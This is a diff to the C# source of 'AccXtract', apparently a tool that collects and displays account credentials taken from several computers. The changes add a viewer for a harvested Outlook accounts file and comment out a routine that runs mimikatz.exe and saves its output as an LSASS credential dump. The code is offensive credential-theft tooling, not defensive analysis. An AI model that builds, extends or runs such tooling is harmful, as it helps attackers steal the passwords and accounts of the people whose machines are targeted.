@@ -97,6 +97,10 @@ namespace AccXtract
             if (diag.ShowDialog() == System.Windows.Forms.DialogResult.OK)
             {
                 AccXtractFolder = diag.SelectedPath;
+
+                //In case someone selects the drive rather than the folder
+                if (Directory.Exists(AccXtractFolder + "\\AccXtract")) AccXtractFolder = AccXtractFolder + "\\AccXtract";
+
                 string[] computers = Directory.GetDirectories(AccXtractFolder);
                 foreach (string computer in computers)
                 {
@@ -403,6 +407,11 @@ Path=Profiles/AccXtract." + profileName);
             }
         }
 
+        private void viewOutlookAccounts(object sender, EventArgs e)
+        {
+            Process.Start(AccXtractFolder + "\\" + Environment.MachineName + "\\Outlook\\accounts.txt");
+        }
+
         #region UI Functions
         private GroupBox addNewComputer(string path)
         {
@@ -472,8 +481,18 @@ Path=Profiles/AccXtract." + profileName);
             }
             #endregion
 
+            #region Outlook
+            if (Directory.Exists(path + "\\Outlook"))
+            {
+                lastPanel = addPanel(@"Outlook accounts (Click to view)", lastPanel, newGroup);
+                Button newButton = addButtonToPanel("accounts.txt", lastPanel);
+                newButton.Click += viewOutlookAccounts;
+            }
+
+            #endregion
+
             #region Windows Passwords
-            if (File.Exists(Directory.GetCurrentDirectory() + "\\Tools\\mimikatz.exe"))
+            /*if (File.Exists(Directory.GetCurrentDirectory() + "\\Tools\\mimikatz.exe"))
             {
                 ProcessStartInfo inf = new ProcessStartInfo();
                 inf.UseShellExecute = false;
@@ -484,7 +503,7 @@ Path=Profiles/AccXtract." + profileName);
                 StreamWriter output = new StreamWriter(AccXtractFolder + "\\" + computerName + "\\Windows\\lsass.txt");
                 output.Write(proc.StandardOutput.ReadToEnd());
                 output.Close();
-            }
+            }*/
             #endregion
 
             return newGroup;
